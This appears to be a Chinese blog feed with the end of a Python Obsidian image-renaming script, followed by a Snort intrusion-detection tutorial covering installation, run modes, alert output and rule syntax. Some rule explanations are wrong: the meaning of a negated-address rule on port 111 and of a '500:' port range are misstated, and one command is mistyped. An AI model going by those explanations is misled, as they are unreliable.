class="line">  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;^Pasted image (\d&#123;14&#125;)$&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line"></span><br><span class="line">            new_filename = <span class="string">f&quot;<span class="subst">&#123;<span class="keyword">match</span>.group(<span class="number">1</span>)&#125;</span><span class="subst">&#123;ext&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">            new_path = os.path.join(asset_dir, new_filename)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(new_path):</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\033[33m跳过\033[0m <span class="subst">&#123;filename&#125;</span> =&gt; <span class="subst">&#123;new_filename&#125;</span>（目标已存在）&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">            shutil.move(old_path, new_path)</span><br><span class="line"></span><br><span class="line">            renamed_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\033[32m重命名\033[0m: <span class="subst">&#123;filename&#125;</span> =&gt; <span class="subst">&#123;new_filename&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> renamed_count == <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[33m提示\033[0m 没有找到需要重命名的 Obsidian 图片&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n\033[32m完成\033[0m 共重命名 <span class="subst">&#123;renamed_count&#125;</span> 个文件&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Obsidian图片链接转换器 + 图片重命名器&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="string">&#x27;--file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Markdown 文件路径&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--img-dir&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;用于替换的图片目录路径（如 /images/）&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--debug&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;显示详细修改位置&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-rename&#x27;</span>, <span class="string">&#x27;--rename-assets&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;对指定目录下的 Obsidian 粘贴图片进行重命名&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.rename_assets:</span><br><span class="line"></span><br><span class="line">        rename_pasted_images(args.rename_assets)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.file <span class="keyword">or</span> <span class="keyword">not</span> args.img_dir:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m错误\033[0m -f 和 -i 参数是必需的，或使用 --rename-assets 模式&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(args.file):</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m错误\033[0m 指定的 Markdown 文件不存在&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;<span class="string">&#x27;=&#x27;</span>*<span class="number">30</span>&#125;</span> 转换开始 <span class="subst">&#123;<span class="string">&#x27;=&#x27;</span>*<span class="number">30</span>&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    process_markdown(args.file, args.img_dir, args.debug)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;=&#x27;</span>*<span class="number">30</span>&#125;</span> 转换结束 <span class="subst">&#123;<span class="string">&#x27;=&#x27;</span>*<span class="number">30</span>&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
<h2 id="使用方式：-1"><a href="#使用方式：-1" class="headerlink" title="使用方式："></a>使用方式：</h2><p>如果要修改图片链接，例如：修改a.md中的内容，对应图片文件夹为：&#x2F;images，使用命令：<br><code>python a.py -f a.md -i /images</code><br>这将会：将<code>![[aaaaaaa.jpg]]</code>，修改为：<code>![aaaaaaa](/images/aaaaaaa.jpg)</code>，同时，如果是<code>![[Pasted image 20250513094420.png]]这样的格式，将会修改为：![20250513094420](/images/20250513094420.jpg)。</code></p>
]]></content>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>入侵检测系统：Snort</title>
    <url>/2025/02/16/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%EF%BC%9ASnort/</url>
    <content><![CDATA[<h1 id="一-系统安装："><a href="#一-系统安装：" class="headerlink" title="一.系统安装："></a>一.系统安装：</h1><p>当时安装的时候看的这一篇文档，感觉还可以：<a class="link"   href="https://www.jianshu.com/p/9296cb4131b5" >安装文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>本人环境：<code>Ubuntu22.04</code></p>
<ol>
<li>安装libpcap:<br><a class="link"   href="https://links.jianshu.com/go?to=http://www.tcpdump.org/" >官网下载<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，其实如果用过<code>tcpdump</code>的话这个是默认安装的。</li>
</ol>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://www.tcpdump.org/release/libpcap-1.10.0.tar.gz</span><br><span class="line">tar -zxvf ./libpcap-1.10.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> ./libpcap-1.10.0.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">最后需要有这一步：</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> /usr/local/lib/libpcap.* /usr/lib/</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>安装LuaJIT:<br><a class="link"   href="https://links.jianshu.com/go?to=http://luajit.org/download.html" >官网下载<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>（这个可以不安装）</li>
</ol>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://luajit.org/git/luajit.git</span><br><span class="line"><span class="built_in">cd</span> ./luajit</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>daq安装:</li>
</ol>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://www.snort.org/downloads/snort/daq-2.0.7.tar.gz</span><br><span class="line">tar -zxvf ./daq-2.0.7.tar.gz</span><br><span class="line"><span class="built_in">cd</span> .//daq-2.0.7</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<ol start="4">
<li>依赖安装:</li>
</ol>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install bison flex </span><br></pre></td></tr></table></figure></div>
<ol start="5">
<li>Snort安装:</li>
</ol>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">get https://www.snort.org/downloads/snort/snort-2.9.20.tar.gz</span><br><span class="line">tar -zxvf ./snort-2.9.20.tar.gz</span><br><span class="line"><span class="built_in">cd</span> ./snort-2.9.20</span><br><span class="line">./configure --enable-sourcefire</span><br></pre></td></tr></table></figure></div>
<h2 id="报错解决："><a href="#报错解决：" class="headerlink" title="报错解决："></a>报错解决：</h2><h3 id="1-check"><a href="#1-check" class="headerlink" title="1.check"></a>1.check</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">No package <span class="string">&#x27;check&#x27;</span> found Consider adjusting the PKG_CONFIG_PATH environment variable <span class="keyword">if</span> you installed software <span class="keyword">in</span> a non-standard prefix. Alternatively, you may <span class="built_in">set</span> the environment variables CHECK_CFLAGS and CHECK_LIBS to avoid the need to call pkg-config. See the pkg-config man page <span class="keyword">for</span> more details.</span><br></pre></td></tr></table></figure></div>
<p>这个是因为没有check库，我们安装一下就好：<br><code>sudo apt-get install check</code></p>
<h3 id="2-daq"><a href="#2-daq" class="headerlink" title="2.daq"></a>2.daq</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">checking <span class="keyword">for</span> daq_load_modules <span class="keyword">in</span> -ldaq_static... no ERROR! daq_static library not found, go get it from http://www.snort.org/.</span><br></pre></td></tr></table></figure></div>
<p>这个错误是因为没有正确安装daq，按照前面安装daq的方法重新安装。</p>
<h3 id="3-luajit"><a href="#3-luajit" class="headerlink" title="3.luajit"></a>3.luajit</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">checking <span class="keyword">for</span> luajit... no ERROR! LuaJIT library not found. Go get it from http://www.luajit.org/ (or) Try compiling without openAppId using <span class="string">&#x27;--disable-open-appid&#x27;</span> configure: error: <span class="string">&quot;Fatal!&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>这个错误是因为系统找不到<code>LuaJIT</code>库，如果不需要<code>openAppId</code>功能的话，可以将其屏蔽：<br><code>./configure --disable-open-appid</code></p>
<h3 id="4-rcp-h"><a href="#4-rcp-h" class="headerlink" title="4.rcp.h"></a>4.rcp.h</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">en -Wall -c -o sp_rpc_check.o sp_rpc_check.c sp_rpc_check.c:32:10: fatal error: rpc/rpc.h: 没有那个文件或目录 32 | <span class="comment">#include &lt;rpc/rpc.h&gt; | ^~~~~~~~~~~ compilation terminated. make[3]: *** [Makefile:489：sp_rpc_check.o] 错误 1 make[3]: 离开目录“/home/shad0hun/snort-2.9.20/src/detection-plugins” make[2]: *** [Makefile:594：install] 错误 2 make[2]: 离开目录“/home/shad0hun/snort-2.9.20/src/detection-plugins” make[1]: *** [Makefile:558：install-recursive] 错误 1 make[1]: 离开目录“/home/shad0hun/snort-2.9.20/src” make: *** [Makefile:516：install-recursive] 错误 1</span></span><br></pre></td></tr></table></figure></div>
<p>这个问题是因为系统找不到指定文件，不要尝试修改Makefile，因为每次.&#x2F;config它都会重置Makefile。<br>解决方法：<br>使用命令<code>sudo find /usr -name &quot;rpc.h&quot;</code>找一下文件位置，我这里是位于<code>/usr/include/ntirpc/rpc/rpc.h</code>。<br>然后我们进入该目录，我们只要将<code>ntirpc</code>目录下的所有内容放到<code>/usr/include/</code>目录下即可。</p>
<h1 id="二-Snort概述："><a href="#二-Snort概述：" class="headerlink" title="二.Snort概述："></a>二.Snort概述：</h1><p>1.嗅探器模式：只是从网络读取数据包并在控制台上以连续流的形式显示<br>2.数据包记录模式：将数据包记录到磁盘<br>3.网络入侵检测系统（NIDS）模式：对网络流量进行检测和分析。</p>
<h2 id="1-嗅探器模式"><a href="#1-嗅探器模式" class="headerlink" title="1.嗅探器模式"></a>1.嗅探器模式</h2><p>所谓的嗅探器模式就是Snort从网络上读出的数据包然后显示在控制台上。<br>如果只想将TCP&#x2F;IP数据包头打印到屏幕上：<br><code>snort -v</code><br>启动之后，我ping了该主机，可以看到效果：<br>![[1.1 v.png]]<br>可以观察到，我们只能看到IP和TCP&#x2F;UDP&#x2F;TCMP标头，不显示其他任何内容。<br>如果想查看其中的应用层数据：<br><code>snort -vd</code><br>![[1.1 vd.png]]<br>可以看到，我们现在不仅能看到头数据，还能看到应用层数据。<br>如果要更具体的显示，比如要显示数据链路层报文头：<br><code>snort -vde</code><br>![[1.1 vde.png]]<br>观察发现，多出来的信息：</p>
<blockquote>
<p>02&#x2F;12-14:21:38.474048 00:50:56:C0:00:08 -&gt; 00:0C:29:07:0C:E9 type:0x800 len:0x4A</p>
</blockquote>
<p>很明显这其中包含了MAC地址信息，这是数据链路层的报文头。<br>最后，这些命令开关也可以单独使用：例如，最后一个命令我们可以这样输入：<br><code>snort -v -d -e</code><br>那么就是说：<br>-v : 打印IP数据报文头<br>-d : 打印应用层数据<br>-e : 打印数据链路层报文头</p>
<h2 id="2-数据包记录模式"><a href="#2-数据包记录模式" class="headerlink" title="2.数据包记录模式"></a>2.数据包记录模式</h2><p>该模式就是吧数据包都记录到磁盘上，使用的时候我们需要指定一个日志记录，Snort就会自动记录数据包：<br><code>snort -dev -l ./log</code><br>那么我们将会在.&#x2F;log文件夹下面看到捕获到的数据包文件。<br>注意需要我们事先创建好log文件夹，如果没有，Snort 将退出并显示错误消息。<br><strong>日志命名规则：后缀为时间戳或远程主机IP地址。</strong><br>如果想要只对本地网络进行日志：<br><code>snort -dev -l ./log -h 192.168.175.0/24</code><br>这个命令告诉Snrot，将进入C类网络92.168.175的所有数据记录到.&#x2F;log文件夹中。<br>如果你使用高速网络或者希望将数据包记录为更紧凑的形式以供以后分析，则应考虑以二进制模式记录：<br><code>snort -l ./log -b</code><br>-b模式下，我们不需要指定-d , -e等选项，因为-b选项默认将所有信息都记录下来。<br>一旦数据包被记录到二进制文件中，我们可以使用tcpdump等读取文件。<br><strong>此外，Snort还可以使用-r开关读出数据包，该开关将其置于回放模式。</strong> 如果你想在嗅探器模式下通过Snort运行二进制日志文件将其数据包显示到屏幕上：<br><code>snort -dv -r filename</code><br>![[1.1 r.png]]<br>在日治包和入侵检测模式下，通过BPF(BSD Packet Filter)接口，可以使用许多方式维护日志文件中的数据。<br>例如，你想从日志文件中提取ICMP包：<br><code>/snort -dvr packet.log icmp</code><br>最后的输出还是像嗅探模式那样将数据包信息打印在控制台中。</p>
<h2 id="3-网络入侵检测系统模式"><a href="#3-网络入侵检测系统模式" class="headerlink" title="3.网络入侵检测系统模式"></a>3.网络入侵检测系统模式</h2><p>要启用网络入侵检测系统(NIDS)模式，以便不记录通过网络发送的每一个数据包：<br><code>snort -dev -l ./log -h 192.168.1.0/24 -c snort.conf</code><br>其中，<code>snort.conf</code>是配置文件，也是规则集文件。Snort会对每个包和规则集进行匹配，发现这样的包就采取行动。如果不指定输出目录，Snort就输出到<code>/var/log/snort</code>目录。<br>注意：如果你想长期使用snort作为自己的入侵检测系统，最好不要使用-v选项。因为使用这个选项，使snort向屏幕上输出一些信息，会大大降低snort的处理速度，从而在向显示器输出的过程中丢弃一些包。<br>此外，在大多数下情况下，也没必要记录数据链路层包头，所以-e选项也可以不用：<br><code>./snort -d -h 192.168.1.0/24 -l ./log -c snort.conf</code><br>这是使用Snort作为网络入侵检测系统最基本的形式,将 Snort 配置为以其最基本的 NIDS 形式运行，使用分层目录结构（就像数据包记录器模式一样），将触发 snort.conf 中指定规则的数据包以纯 ASCII 格式记录到磁盘</p>
<h3 id="NIDS模式输出选项"><a href="#NIDS模式输出选项" class="headerlink" title="&lt;1&gt;.NIDS模式输出选项"></a>&lt;1&gt;.NIDS模式输出选项</h3><p>在NIDS模式下，有很多方式配置Snort的输出。在默认情况下，Snort以ASCII格式记录日志，使用full报警机制。如果使用full报警机制，Snort会在包头之后打印报警信息，如果你不需要日志包，则可以使用-N选项。<br>Snort有6种报警机制：full、fast、socket、syslog、smb(winpopup)和none。其中有4个可以在命令行状态下使用-A选项设置。这4个是：</p>
<table>
<thead>
<tr>
<th>-A fast:</th>
<th>报警信息包括：时间戳，报警信息，源&#x2F;目的IP地址以及端口</th>
</tr>
</thead>
<tbody><tr>
<td>-A full</td>
<td>默认报警模式，这是默认的警报模式，如果您未指定模式，它将自动使用</td>
</tr>
<tr>
<td>-A unsock</td>
<td>把报警发送到一个UNIX套接字，需要有一个程序进行时监听，这样可以实现事实报警</td>
</tr>
<tr>
<td>-A none</td>
<td>关闭报警机制</td>
</tr>
<tr>
<td>-A console</td>
<td>将fast样式’警报发送到控制台</td>
</tr>
<tr>
<td>-A cmg</td>
<td>生成“cmg样式”警报</td>
</tr>
<tr>
<td>这里我们就看一下这几种区别：</td>
<td></td>
</tr>
<tr>
<td><strong>&#x3D;&#x3D;-A fast:&#x3D;&#x3D;</strong></td>
<td></td>
</tr>
<tr>
<td>![[2.1 fast.png]]</td>
<td></td>
</tr>
<tr>
<td>fast选项下，我们可以看到，会记录时间，后面这三个数字，在下面&#x3D;&#x3D;《了解警报输出》&#x3D;&#x3D;会有讲解，我们自己写的msg，priority，数据包类型，源，目的端口。</td>
<td></td>
</tr>
<tr>
<td>&#x3D;&#x3D;<strong>-A full：&#x3D;&#x3D;</strong></td>
<td></td>
</tr>
<tr>
<td>![[2.1 full.png]]</td>
<td></td>
</tr>
<tr>
<td>full选项下，可以看到记录比fast选项详细了很多。</td>
<td></td>
</tr>
<tr>
<td><strong>&#x3D;&#x3D;-A console：&#x3D;&#x3D;</strong></td>
<td></td>
</tr>
<tr>
<td>console选项则将alert直接输出到控制台：</td>
<td></td>
</tr>
<tr>
<td>![[2.1 console.png]]</td>
<td></td>
</tr>
<tr>
<td><strong>&#x3D;&#x3D;-A cmg:&#x3D;&#x3D;</strong></td>
<td></td>
</tr>
<tr>
<td>![[2.1 cmg.png]]</td>
<td></td>
</tr>
</tbody></table>
<p>使用-s选项可以使snort把报警消息发送到syslog，默认的设备是LOG_AUTHPRIV和LOG_ALERT。可以修改snort.conf文件修改其配置。</p>
<ul>
<li>登录到默认（解码的 ASCII）功能并将警报发送到 syslog<br><code>./snort -c snort.conf -l ./log -h 192.168.6.0/24 -s</code></li>
<li>登录到 &#x2F;var&#x2F;log &#x2F;snort 中的默认工具，并将警报发送到快速警报文件<br><code>./snort -c snort.conf -A fast-h 192.168.6.0/24</code></li>
</ul>
<h3 id="了解标准警报输出"><a href="#了解标准警报输出" class="headerlink" title="&lt;2&gt;.了解标准警报输出"></a>&lt;2&gt;.了解标准警报输出</h3><p>Snort生成警报消息时，通常如下所示：<br><code>[**] [116:56:1] (snort_decoder): T/TCP Detected [**]</code><br>对于[116:56:1]:<br>第一个数字是生成器ID，它告诉用户Snort的哪个组件生成了此警报，在这种情况下，我们知道此时间来自Snort的“解码”（116）组件。<br>第二个数字是Snort ID也就是SID，我们写Snort规则的时候写的哪个sid。<br>第三个数字是修订ID，此数字主要在编写签名时使用，因为规则的每个表示形式都应使用rev选项将该数字递增。</p>
<h3 id="作为守护进程运行"><a href="#作为守护进程运行" class="headerlink" title="&lt;3&gt;.作为守护进程运行"></a>&lt;3&gt;.作为守护进程运行</h3><p>如果要将 Snort 作为守护进程运行，可以将 -D 开关添加到前面部分中描述的任意组合。请注意，如果您希望能够通过向守护进程发送 SIGHUP 信号来重新启动 Snort，则_必须_在启动时指定 Snort 二进制文件的完整路径，例如：<br><code>/usr/local/bin/snort -d -h 192.168.1.0/24 -l /var/log/snortlogs -c /usr/local/etc/snort.conf -s -D</code></p>
<h2 id="4-snort-conf配置文件"><a href="#4-snort-conf配置文件" class="headerlink" title="4.snort.conf配置文件"></a>4.snort.conf配置文件</h2><blockquote>
<ol>
<li>Set the network variables.  设置各类网络地址，规则中易于使用</li>
<li>Configure the decoder      设置解码器</li>
<li>Configure the base detection engine  设置基础检测引擎</li>
<li>Configure dynamic loaded libraries   设置动态链接库</li>
<li>Configure preprocessors     设置预处理器</li>
<li>Configure output plugins    设置输出插件</li>
<li>Customize your rule set     设置自定义规则</li>
<li>Customize preprocessor and decoder rule set设置预处理、解码器规则</li>
<li>Customize shared object rule set 设置共享对象规则集</li>
</ol>
</blockquote>
<h1 id="三-Snort规则编写"><a href="#三-Snort规则编写" class="headerlink" title="三.Snort规则编写"></a>三.Snort规则编写</h1><p>大多数Snort规则都写在一行中，Snort规则分为两个逻辑部分：规则头和规则选项。<br>规则头包含规则的操作，协议，源和目的ip地址和子网掩码，以及源和目的端口信息。规则选项部分包含警报消息以及有关检查数据包的哪些部分以及确定是否采取规则操作的信息。<br>![[3.1 snort.png]]<br>第一个括号之前的文本是规则头，括号内的部分包含规则选项。规则选项部分中，括号之前的单词称为选项关键字。<br>构成规则的所有元素必须为真，才能执行值是否的规则操作。当这些元素放在一起时，可以视为形成逻辑AND语句。同时，Snort规则集中的各种规则可以视为大型OR语句。</p>
<h2 id="1-规则头"><a href="#1-规则头" class="headerlink" title="1.规则头"></a>1.规则头</h2><p>规则头包含了定义数据包的谁，哪里和什么信息，以及出现具有规则中知识的所有属性的规则包时应该执行的操作。</p>
<h3 id="规则操作"><a href="#规则操作" class="headerlink" title="&lt;1&gt;.规则操作"></a>&lt;1&gt;.规则操作</h3><p>Snort规则中的第一项就是规则操作，规则操作告诉Snort在找到符合规则条件的数据包时要做什么。Snort中有3个可用的默认操作：alert（警报），log（记录），pass（忽略）。此外，如果你以内联模式运行Snort，则您还有其他的选项，包括drop（阻止并记录），reject（阻止）和sdrop（阻止但不记录）。<br>另外，也可以定义自己的规则类型，并将一个或者多个输出插件与其关联，然后，你可以将规则类型用作Snort规则中的操作。<br>示例：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ruletype suspicious&#123;</span><br><span class="line">	type log output</span><br><span class="line">	log_tcpdump:suspicious.log</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>此示例将创建一个记录到 syslog 和 tcpdump 的规则类型:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ruletype redalert</span><br><span class="line">   &#123;</span><br><span class="line">         type alert </span><br><span class="line">         output alert_syslog: LOG_AUTH LOG_ALERT </span><br><span class="line">         output log_tcpdump: suspicious.log</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="协议"><a href="#协议" class="headerlink" title="&lt;2&gt;.协议"></a>&lt;2&gt;.协议</h3><p>规则中的下一个字段是协议，Snort目前分析可疑行为的协议有四种：<code>tcp,udp,icmp和ip</code>,将来可能会更多，比如<code>arp,igrp,gre,ospf,rip,ipx</code>等。</p>
<h3 id="ip地址"><a href="#ip地址" class="headerlink" title="&lt;3&gt;.ip地址"></a>&lt;3&gt;.ip地址</h3><p>规则头的下一个部分决定了那些ip可以触发该规则。<br>关键字”any”可以被用来定义任何地址。<br>Snort没有提供根据ip地址查询域名的机制。地址就是由直接的数字型ip地址和一个cidr块组成的。Cidr块指示作用在规则地址和需要检查的进入的任何包的网络掩码。&#x2F;24表示c类网络，&#x2F;16表示b类网络，&#x2F;32表示一个特定的机器的地址。例如，192.168.1.0&#x2F;24代表从192.168.1.1到192.168.1.255的地址块。在这个地址范围的任何地址都匹配使用这个192.168.1.0&#x2F;24标志的规则。这种记法给我们提供了一个很好的方法来表示一个很大的地址空间。<br>有一个操作符可以应用在ip地址上，它是否定运算符（!）。这个操作符告诉snort匹配除了列出的ip地址以外的所有ip地址。否定操作符用”！”表示。下面这条规则对任何来自本地网络以外的流都进行报警。<br>比如：<code>alert tcp !192.168.1.0/24 any -&gt; 192.168.1.0/24 111(content:&quot;|00 01 86 a5|&quot;;msg:&quot;external mountd access&quot;;)</code><br>这条规则表示：任何源ip和目的ip地址不是来自内部网络，且目的端口不为111的tcp数据包。<br>此外，还可以指定ip地址列表，IP地址列表通过在方括号内将逗号分隔ip地址和CIDR块列表来指定。<br>示例：<br><code>alert tcp ![192.168.1.0/24,10.1.1.0/24] any -&gt; [192.168.1.0/.24,10.1.1.0/24] 111 (content:&quot;|00 01 86 a5|&quot;;msg:&quot;external mountd access&quot;;)</code></p>
<h3 id="端口号："><a href="#端口号：" class="headerlink" title="&lt;4&gt;.端口号："></a>&lt;4&gt;.端口号：</h3><p>端口号可以用多种方式指定，包括任意端口，静态端口，端口范围和非运算符。任意端口时通配符，静态端口即为指定单个端口，端口范围用:表示，范围运算符可以用多种方式表示：<br><code>log udp any any -&gt; 192.168.1.0/24 1:1024</code>源ip，端口为任意，目的IP为192.168.1.0&#x2F;24内任意一个，目的端口范围为1~1024<br><code>log tcp any any-&gt; 192.168.1.0/24 :6000</code>源ip，端口为任意，目的IP为192.168.1.0&#x2F;24内任意一个，目的端口范围为：小于等于6000<br><code>log tcp any :1024 -&gt; 192.168.1.0/24 500:</code>源ip为任意，源端口小于等于1024，目的IP为192.168.1.0&#x2F;24内任意一个，目的端口范围为：大于或等于6000</p>
<h3 id="方向运算符"><a href="#方向运算符" class="headerlink" title="&lt;3&gt;.方向运算符"></a>&lt;3&gt;.方向运算符</h3><p>方向运算符<code>-&gt;</code>表示规则适用的流量的方向,方向运算符左侧的 IP 地址和端口号被视为来自源主机的流量，而方向运算符右侧的地址和端口信息是目标主机的流量。还有一个双向运算符，用符号<code>&lt;&gt;</code>表示。这告诉 Snort 考虑源方向或目标方向的地址&#x2F;端口对。这对于记录&#x2F;分析对话的双方（例如 telnet 或 POP3 会话）非常方便。</p>
<h2 id="2-规则选项："><a href="#2-规则选项：" class="headerlink" title="2.规则选项："></a>2.规则选项：</h2><p>规则选项是 Snort 入侵检测引擎的核心，集易用性、强大功能和灵活性于一身。所有 Snort 规则选项都使用分号 (;) 字符相互分隔。规则选项关键字与其参数使用冒号 (:) 字符分隔。</p>
<p>规则选项主要有四类：<br><strong>general</strong><br>这些选项提供有关规则的信息，但在检测期间不会产生任何影响<br><strong>payload</strong><br>这些选项都在数据包有效负载内查找数据，并且可以相互关联<br><strong>non-payload</strong><br>这些选项寻找非有效载荷数据<br><strong>post-detection</strong><br>这些选项是规则特定的触发器，在规则“触发”后发生。</p>
<h3 id="1）一般规则选项"><a href="#1）一般规则选项" class="headerlink" title="1）一般规则选项"></a>1）一般规则选项</h3><h4 id="msg"><a href="#msg" class="headerlink" title="&#x3D;&#x3D;msg&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;msg&#x3D;&#x3D;</strong></h4><p>msg 规则选项告诉日志记录和警报引擎要与数据包转储一起打印的消息或警报。它是一个简单的文本字符串，利用 <code>\ </code>作为转义字符，用来指示可能混淆 Snort 规则解析器的离散字符（例如分号 ; 字符）。<br><code>msg:&quot;&lt;message text&gt;&quot;;</code></p>
<h4 id="reference"><a href="#reference" class="headerlink" title="&#x3D;&#x3D;reference&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;reference&#x3D;&#x3D;</strong></h4><p>引用关键字允许规则包含对外部攻击识别系统的引用。该插件目前支持多个特定系统以及唯一 URL。输出插件将使用此插件提供有关所生成警报的其他信息的链接。</p>
<p>请务必查看 <a class="link"   href="http://www.snort.org/pub-bin/sigs-search.cgi/" >http://www.snort.org/pub-bin/sigs-search.cgi/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，以了解基于sid 索引警报描述的系统</p>
<h4 id="gid"><a href="#gid" class="headerlink" title="&#x3D;&#x3D;gid&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;gid&#x3D;&#x3D;</strong></h4><p>gid关键字用于标识在触发特定规则时Snort的哪个部分生成事件。例如，gid 1与规则子系统相关联，并且为特定的预处理器和解码器指定超过100的各种gid。请参阅源代码树中的etc&#x2F;generators以获取当前使用的生成器ID。请注意，gid关键字是可选的，如果没有在规则中指定，它将默认为1，并且规则将成为通用规则子系统的一部分。为了避免与Snort中定义的gids（由于某些原因，它没有注意到etc&#x2F;generators）发生冲突，建议使用从1，000，000开始的值。对于常规规则编写，不建议使用gid关键字。此选项应与sid关键字一起使用。(See部分）<br><code>gid:&lt;generator id&gt;;</code></p>
<h4 id="sid"><a href="#sid" class="headerlink" title="&#x3D;&#x3D;sid&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;sid&#x3D;&#x3D;</strong></h4><p>sid关键字用于唯一标识Snort规则。这些信息允许输出插件轻松地识别规则。此选项应与rev关键字一起使用。<br>文件sid-msg.map包含警报消息到Snort规则ID的映射。在对警报进行后处理以将ID映射到警报消息时，此信息非常有用。<br><code>sid:&lt;snort rules id&gt;;</code></p>
